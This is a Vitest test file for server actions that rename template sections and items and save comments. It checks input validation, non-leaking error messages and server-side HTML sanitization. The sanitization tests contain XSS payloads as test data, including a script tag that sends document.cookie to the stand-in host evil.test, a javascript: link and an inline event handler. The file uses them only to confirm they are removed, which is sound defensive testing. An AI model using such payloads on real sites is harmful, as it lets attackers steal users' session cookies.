import { describe, expect, it, vi, beforeEach, afterEach } from "vitest";

const createServiceRoleClient = vi.hoisted(() => vi.fn());
const revalidatePath = vi.hoisted(() => vi.fn());

vi.mock("@/lib/supabase/server-client", () => ({ createServiceRoleClient }));
vi.mock("next/cache", () => ({ revalidatePath }));

const { updateSectionName, updateItemName, updateCommentContent } = await import("./template-edit-actions");

/** Captures what would have been written, and lets a test force a DB failure. */
function mockClient(result: { error: unknown } = { error: null }) {
  const update = vi.fn().mockReturnValue({ eq: vi.fn().mockResolvedValue(result) });
  const from = vi.fn().mockReturnValue({ update });
  createServiceRoleClient.mockReturnValue({ from });
  return { from, update, written: () => update.mock.calls[0]?.[0] };
}

beforeEach(() => {
  createServiceRoleClient.mockReset();
  revalidatePath.mockReset();
});

afterEach(() => vi.restoreAllMocks());

const TEMPLATE_ID = "11111111-1111-4111-8111-111111111111";
const NODE_ID = "22222222-2222-4222-8222-222222222222";

describe("edit actions — the happy path", () => {
  it("writes a section name and revalidates the template page", async () => {
    const client = mockClient();
    const result = await updateSectionName(TEMPLATE_ID, NODE_ID, "Roof");

    expect(result).toEqual({ success: true });
    expect(client.from).toHaveBeenCalledWith("sections");
    expect(client.written()).toEqual({ name: "Roof" });
    expect(revalidatePath).toHaveBeenCalledWith(`/templates/${TEMPLATE_ID}`);
  });

  it("writes an item name to the items table", async () => {
    const client = mockClient();
    await updateItemName(TEMPLATE_ID, NODE_ID, "Gutters");
    expect(client.from).toHaveBeenCalledWith("items");
    expect(client.written()).toEqual({ name: "Gutters" });
  });
});

// Failure case 9 — a save that cannot complete.
describe("edit actions — save failure", () => {
  it("returns a typed failure instead of throwing when the DB rejects the write", async () => {
    vi.spyOn(console, "error").mockImplementation(() => {});
    mockClient({ error: new Error('permission denied for table "sections"') });

    const result = await updateSectionName(TEMPLATE_ID, NODE_ID, "Roof");

    expect(result.success).toBe(false);
  });

  it("never leaks the database's own words to the browser", async () => {
    vi.spyOn(console, "error").mockImplementation(() => {});
    mockClient({ error: new Error('permission denied for table "sections"') });

    const result = await updateSectionName(TEMPLATE_ID, NODE_ID, "Roof");

    expect(result.success).toBe(false);
    if (result.success) return;
    expect(result.error).not.toContain("permission denied");
    expect(result.error).not.toContain("sections");
    // It must still reassure the person their edit survived.
    expect(result.error).toContain("hasn't been lost");
  });

  it("does not revalidate — a failed save must not swap the UI back to stale server state", async () => {
    vi.spyOn(console, "error").mockImplementation(() => {});
    mockClient({ error: new Error("write failed") });

    await updateSectionName(TEMPLATE_ID, NODE_ID, "Roof");

    expect(revalidatePath).not.toHaveBeenCalled();
  });

  it("returns a result rather than an unhandled rejection when the client can't even be built", async () => {
    // This is what left the editor stuck on "Saving…" before: a throw during
    // client construction never resolved to { success: false }.
    vi.spyOn(console, "error").mockImplementation(() => {});
    createServiceRoleClient.mockImplementation(() => {
      throw new Error("Supabase server credentials are not configured. Set SUPABASE_SERVICE_ROLE_KEY.");
    });

    const result = await updateSectionName(TEMPLATE_ID, NODE_ID, "Roof");

    expect(result.success).toBe(false);
    if (result.success) return;
    expect(result.error).not.toContain("SUPABASE_SERVICE_ROLE_KEY");
  });
});

describe("edit actions — validation rejects bad input before any write", () => {
  it("rejects an empty name and never touches the database", async () => {
    const client = mockClient();
    const result = await updateSectionName(TEMPLATE_ID, NODE_ID, "   ");

    expect(result.success).toBe(false);
    expect(client.from).not.toHaveBeenCalled();
  });

  it("rejects an id that isn't a uuid", async () => {
    const client = mockClient();
    const result = await updateItemName(TEMPLATE_ID, "not-a-uuid", "Gutters");

    expect(result.success).toBe(false);
    expect(client.from).not.toHaveBeenCalled();
  });
});

// Failure case 6 — unsafe HTML, arriving from a client that can be bypassed.
describe("updateCommentContent — sanitizes server-side, not in the browser", () => {
  it("strips a script tag before it reaches the database", async () => {
    const client = mockClient();
    await updateCommentContent(
      TEMPLATE_ID,
      NODE_ID,
      "<p>Roof looks fine.<script>fetch('https://evil.test?c='+document.cookie)</script></p>"
    );

    const written = client.written();
    expect(written.safe_html).not.toContain("<script");
    expect(written.safe_html).not.toContain("evil.test");
    // The legitimate text around it survives — sanitizing is not discarding.
    expect(written.plain_text).toContain("Roof looks fine.");
  });

  it("removes a javascript: link but keeps its visible text", async () => {
    const client = mockClient();
    await updateCommentContent(TEMPLATE_ID, NODE_ID, '<p><a href="javascript:alert(1)">See report</a></p>');

    const written = client.written();
    expect(written.safe_html).not.toContain("javascript:");
    expect(written.plain_text).toContain("See report");
  });

  it("strips an inline event handler", async () => {
    const client = mockClient();
    await updateCommentContent(TEMPLATE_ID, NODE_ID, '<p onmouseover="alert(1)">Hover me</p>');

    expect(client.written().safe_html).not.toContain("onmouseover");
  });

  it("keeps allowlisted formatting and safe links intact", async () => {
    const client = mockClient();
    await updateCommentContent(
      TEMPLATE_ID,
      NODE_ID,
      '<p><strong>Recommend</strong> review: <a href="https://example.com/guide">guide</a></p>'
    );

    const written = client.written();
    expect(written.safe_html).toContain("<strong>Recommend</strong>");
    expect(written.safe_html).toContain('href="https://example.com/guide"');
    expect(written.safe_html).toContain('rel="noopener noreferrer"');
  });

  it("keeps plain_text in step with the saved HTML", async () => {
    const client = mockClient();
    await updateCommentContent(TEMPLATE_ID, NODE_ID, "<p><em>Gutters</em> are clear.</p>");

    const written = client.written();
    expect(written.plain_text).toBe("Gutters are clear.");
    expect(written.plain_text).not.toContain("<");
  });
});
